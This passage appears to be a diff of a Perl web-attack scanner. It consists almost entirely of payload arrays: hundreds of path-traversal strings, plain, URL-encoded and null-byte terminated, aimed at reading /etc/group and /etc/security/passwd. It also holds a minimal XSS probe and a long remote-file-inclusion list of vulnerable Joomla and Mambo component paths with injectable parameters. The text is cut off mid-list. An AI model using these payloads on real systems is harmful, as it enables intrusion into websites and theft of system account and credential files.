0","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub XSS {@XSS = ("%27");}
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub RFI {@RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", 